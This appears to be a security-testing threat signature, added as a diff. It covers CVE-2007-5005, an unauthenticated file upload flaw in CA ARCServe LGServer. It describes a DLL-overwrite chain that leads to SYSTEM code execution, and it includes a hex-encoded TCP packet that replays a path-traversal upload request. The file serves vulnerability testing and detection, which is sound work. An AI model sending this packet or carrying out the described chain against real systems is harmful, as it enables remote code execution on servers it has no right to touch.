@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="CA BrightStor ARCServe Backup LGServer Arbitrary File Upload"/>
+    <EngDesc display="true" value="An arbitrary file upload vulnerability exists in CA BrightStor ARCServe Backup for Laptops and Desktops. The vulnerability is due to insufficient access control in the LGServer process while handling file uploads from remote users. A remote unauthenticated attacker could exploit this vulnerability to upload file to specified location on the target file system. Moreover, the attacker can facilitate other functionality of the affected server to load and execute the uploaded file with System privileges. In a successful attack case, the attacker could write arbitrary file to an arbitrary directory using SYSTEM-level privileges. This vulnerability can be used to overwrite critical files, such as ARCserve LGServer's &quot;security.dll&quot; with malicious content. Overwritten DLL can then be immediately loaded into memory by calling another rxrLogin request, which would now inject the potentially-malicious &quot;security.dll&quot; into the ARCserve LGServer process."/>
+    <Intent display="true">
+      <item value="Code_Execution/Access_Control_Weakness"/>
+    </Intent>
+    <Protocol display="true" value="CA BrightStor ARCServe Backup LGServer Proprietary Protocol"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="CA"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="CA_ARCserve_Backup_for_Laptops_and_Desktops/CA_Desktop_Management_Suite/CA_Protection_Suites"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="CA_ARCserve_Backup_for_Laptops_and_Desktops_r11.0&amp;r11.1&amp;r11.1_SP1&amp;r11.1_SP2&amp;r11.5&amp;r4.0/CA_Desktop_Management_Suite_r11.0&amp;r11.1&amp;r11.2/CA_Protection_Suites_2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2007-5005"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="1c8cd33e5649b5b9bf36c737fe385d2b"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634008153151602501"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1265279402" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="M"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="N"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:07:E9:0A:07:E5" destMac="00:0C:29:E7:13:43" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0076" Identification="841D" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="54ED" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="58501" destPort="$destPort" SeqNumber="95A0576E" AckNumber="F9C45D2F" HeaderLength="08" WindowSize="05B4" Checksum="F456" UrgentPointer="0000" Options="0101080A1492D37900000000" Payload="303030303030303035367278725265636569766546696C6546726F6D5365727665727E7E387E7E2E2E5C706F632E7478747E7E32367E7E2D32313230303333373839" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
